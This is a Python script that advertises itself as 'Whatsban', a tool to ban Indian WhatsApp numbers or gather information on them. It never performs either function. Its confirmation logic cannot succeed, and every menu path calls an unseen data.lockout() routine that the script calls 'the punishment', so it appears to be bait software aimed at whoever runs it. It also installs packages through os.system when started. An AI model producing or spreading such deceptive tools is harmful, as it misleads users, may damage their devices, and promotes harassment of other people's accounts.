# Whatsapp number banning tool
#
#
import os
import time
import sys
import data

print("Installing packages . . .")
os.system("clear")
os.system("pkg install cmatrix")
os.system("pip3 install colorama")
os.system("clear")
#
# Now importing colorama
#
import colorama
from colorama import Fore
#
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
def banner_display():
    print(f''' {Fore.CYAN}
           _             _         _                   
__      __| |__    __ _ | |_  ___ | |__    __ _  _ __  
\ \ /\ / /| '_ \  / _` || __|/ __|| '_ \  / _` || '_ \ 
 \ V  V / | | | || (_| || |_ \__ \| |_) || (_| || | | |
  \_/\_/  |_| |_| \__,_| \__||___/|_.__/  \__,_||_| |_|
   {Fore.YELLOW}                                                              
Coded by 47hxl-53r
Whatsban v1.0
Whatsapp number banner tool
{Fore.CYAN}
*************************************************
   {Fore.WHITE} ''')
banner_display()
#
#
def program():
    number = input("[+] Number: +91")
    realnumber = "+91"+number
    check = number.isnumeric()
    lennber = len(number)
    if (check == True):
        if (lennber < 10 or lennber > 10):
            delay_print(f"{Fore.RED}Number must be 10 digits")
            program()
        elif (lennber==10):
            delay_print(f"{Fore.YELLOW}1) Ban number")
            delay_print(f"{Fore.YELLOW}2) Information about this number")
            option = input(f"{Fore.YELLOW}[+] Choose an option: ")
            if (option=="1"):
                delay_print(f"{Fore.YELLOW}Are you sure to ban "+realnumber+"?")
                yesorno1 = input("(Y/N): ")
                if (yesorno1 == "Y"):
                    if (yesorno1 == "y"):
                        delay_print(f"{Fore.WHITE}Sorry bro, next time")
                        data.lockout()
                else:
                    delay_print(f"{Fore.YELLOW}Here is the punishment for other option")
                    data.lockout()

            elif (option=="2"):
                delay_print(f"{Fore.YELLOW}Gather information for "+realnumber+"?")
                yesorno2 = input("(Y/N): ")
                if (yesorno2 == "Y"):
                    if (yesorno2 == "y"):
                        delay_print(f"{Fore.WHITE}Sorry bro, next time")
                        data.lockout()
                else:
                    delay_print(f"{Fore.YELLOW}Here is the punishment for other option")
                    data.lockout()


            else:
                delay_print(f"{Fore.RED}It's not an option")
                program()


    else:
        delay_print(f"{Fore.RED}Number is incorrect... Please try again . . .")
        print(f"{Fore.WHITE}")
        program()